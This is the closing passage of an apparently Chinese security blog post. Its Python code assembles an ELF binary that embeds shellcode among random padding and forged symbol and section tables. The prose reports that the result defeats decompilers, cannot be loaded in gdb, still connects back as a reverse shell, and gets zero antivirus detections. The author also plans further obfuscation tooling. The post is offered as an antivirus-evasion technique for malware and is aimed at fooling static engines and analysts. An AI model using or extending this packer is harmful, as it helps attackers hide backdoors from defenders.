elf_header.e_shstrndx = len( sections ) - 1
elf_header.e_shnum = len( sections )
elf_header.e_shentsize = c.sizeof( ElfN_Shdr )

import random
with open(FILENAME,"wb") as fd:
    elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))
    fd.write( elf_header_bytes)
    for ph in pheaders:
        fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )

    fd.write( bytes([ random.randint(0x00,0xff) for i in  range(PT_NOTE_LEN)]  ) )
    fd.write(shellcode)
    fd.write( bytes( [ random.randint(0x00,0xff) for i in  range(PT_TLS_LEN)] )  )
    fd.write( bytes( [ random.randint(0x00,0xff) for i in  range(LOADABLE_LEN)] ) )
    fd.write( data_content.dump() )
    fd.write( shstrtab_content.dump() )
    fd.write( strtab_content.dump() )

    # 写入符号
    for tmp in sym_list:
        fd.write( c.string_at( c.addressof(tmp),c.sizeof(tmp) ) )

    fd.write( b"\x00" * e_shoff_pad  )

    for se in sections:
        fd.write( c.string_at( c.addressof(se),c.sizeof(se) ) )
```



## 检查最后的伪造效果

在进行符号伪造之前，代码相对来讲还是比较清晰可见的。

[![](https://p5.ssl.qhimg.com/t0108f643dbf3562892.png)](https://p5.ssl.qhimg.com/t0108f643dbf3562892.png)

进行符号伪造之后，所有的一切都看起来非常的凌乱。

[![](https://p2.ssl.qhimg.com/t0159238e94b0784f6e.png)](https://p2.ssl.qhimg.com/t0159238e94b0784f6e.png)

其实这里的符号信息就类似于自然语言中的断句，们相当于随意的插入了一些标点符号，导致反编译结果混糅杂乱。

这个二进制功能是正常的，可以成功回连。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013bda1a4c55fc477f.png)

除此之外，还有一个意外收获，这个二进制gdb无法调试。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f6c910b22ffebd5e.png)

至于为什么无法被gdb加载，我们日后再写文章进行详细的解释。<br>
最后看一下免杀效果，其实都不用看，肯定是妥妥的0查杀呗。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ba5ae2db8221393b.png)

虽然本文费尽心机做了一些障眼法，但是也只是能够欺骗静态的杀毒引擎以及没有经验的安全工作人员，并不能真正的增加人工分析的难度，所以在下一篇文章中我决定进一步的编写花指令生成和指令混淆等功能。本文到此为止，后续敬请期待…..
